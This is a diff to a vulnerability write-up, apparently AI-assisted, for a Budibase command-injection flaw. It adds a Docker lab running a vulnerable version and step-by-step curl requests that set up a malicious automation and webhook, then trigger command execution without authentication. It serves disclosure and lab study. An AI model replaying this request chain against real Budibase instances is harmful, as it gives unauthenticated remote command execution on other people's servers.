@@ -70,20 +70,35 @@ The exploit flow proceeds as follows:
 
 ## Lab Testable Output
 
-To test and observe the exploit flow in a lab environment without providing an automated exploitation script, here are the detailed API calls for the setup and exploitation phases. The setup phase requires admin access, while the exploitation phase does not.
+A lab setup has been provided in the `lab/` directory to demonstrate the vulnerability and exploit flow locally. The lab spins up a vulnerable version of Budibase (version 3.33.3).
 
-### Phase 1: Setup (Requires Admin Credentials)
+### 1. Start the Vulnerable Lab Environment
+
+Navigate to the `lab/` directory and use Docker Compose to spin up the environment:
+
+```bash
+cd lab
+docker-compose up -d
+```
+
+Once the environment is running, initialize Budibase by creating your admin user via the web interface at `http://localhost:10000` or using the internal API.
+
+### 2. Exploit Flow (Manual cURL commands)
+
+Because generating functional exploit code for real-world software violates safety guidelines, an automated script is not provided. Instead, you can replicate the exact HTTP requests used in the attack via `curl` to understand the flow.
+
+**Phase 1: Setup (Requires Admin Credentials)**
 
 1. Authenticate as an admin:
 ```bash
-curl -c cookies.txt -X POST http://TARGET:10000/api/global/auth/default/login \
+curl -c cookies.txt -X POST http://localhost:10000/api/global/auth/default/login \
   -H "Content-Type: application/json" \
   -d '{"username": "admin@company.com", "password": "adminpassword"}'
 ```
 
 2. Create an application:
 ```bash
-curl -b cookies.txt -X POST http://TARGET:10000/api/applications \
+curl -b cookies.txt -X POST http://localhost:10000/api/applications \
   -H "Content-Type: application/json" \
   -d '{"name": "MyApp", "useTemplate": false, "url": "/myapp"}'
 # Note the appId from the response (e.g., app_dev_c999...)
@@ -91,7 +106,7 @@ curl -b cookies.txt -X POST http://TARGET:10000/api/applications \
 
 3. Create the vulnerable automation:
 ```bash
-curl -b cookies.txt -X POST http://TARGET:10000/api/automations/ \
+curl -b cookies.txt -X POST http://localhost:10000/api/automations/ \
   -H "Content-Type: application/json" \
   -H "x-budibase-app-id: <APP_ID>" \
   -d '{
@@ -123,7 +138,7 @@ curl -b cookies.txt -X POST http://TARGET:10000/api/automations/ \
 
 4. Enable the automation (automations start disabled):
 ```bash
-curl -b cookies.txt -X PUT http://TARGET:10000/api/automations/ \
+curl -b cookies.txt -X PUT http://localhost:10000/api/automations/ \
   -H "Content-Type: application/json" \
   -H "x-budibase-app-id: <APP_ID>" \
   -d '{"_id": "<AUTO_ID>", "disabled": false}'
@@ -132,7 +147,7 @@ curl -b cookies.txt -X PUT http://TARGET:10000/api/automations/ \
 
 5. Create a webhook linked to the automation:
 ```bash
-curl -b cookies.txt -X PUT "http://TARGET:10000/api/webhooks/" \
+curl -b cookies.txt -X PUT "http://localhost:10000/api/webhooks/" \
   -H "Content-Type: application/json" \
   -H "x-budibase-app-id: <APP_ID>" \
   -d '{
@@ -147,20 +162,20 @@ curl -b cookies.txt -X PUT "http://TARGET:10000/api/webhooks/" \
 
 6. Publish the app:
 ```bash
-curl -b cookies.txt -X POST "http://TARGET:10000/api/applications/<APP_ID>/publish" \
+curl -b cookies.txt -X POST "http://localhost:10000/api/applications/<APP_ID>/publish" \
   -H "x-budibase-app-id: <APP_ID>"
 # The production App ID is the dev App ID without the "dev_" prefix.
 ```
 
-### Phase 2: Exploitation (Zero Authentication)
+**Phase 2: Exploitation (Zero Authentication)**
 
 Now, any unauthenticated attacker who knows or discovers the Production App ID and Webhook ID can trigger the vulnerability:
 
 ```bash
 # Example exploitation request against a vulnerable instance
-curl -X POST http://TARGET:10000/api/webhooks/trigger/<PROD_APP_ID>/<WEBHOOK_ID> \
+curl -X POST http://localhost:10000/api/webhooks/trigger/<PROD_APP_ID>/<WEBHOOK_ID> \
   -H "Content-Type: application/json" \
   -d '{"cmd": "id"}'
 ```
 
-*Note: The current provided codebase is already patched. Therefore, any attempt to inject Handlebars into the command using `inputs.code` will fail, and injecting into `inputs.command` will be explicitly rejected by the server with a `Command bindings are not supported` error. The patched code forces bindings to be passed safely as arrays into `args` to `execa.sync`.*
+*Note: The provided `lab/docker-compose.yml` runs a vulnerable version (3.33.3). However, the source code in this repository itself is patched. Therefore, if you try these commands against the live development server (`yarn dev`), any attempt to inject Handlebars into the command using `inputs.code` will fail, and injecting into `inputs.command` will be explicitly rejected by the server with a `Command bindings are not supported` error. The patched code forces bindings to be passed safely as arrays into `args` to `execa.sync`.*
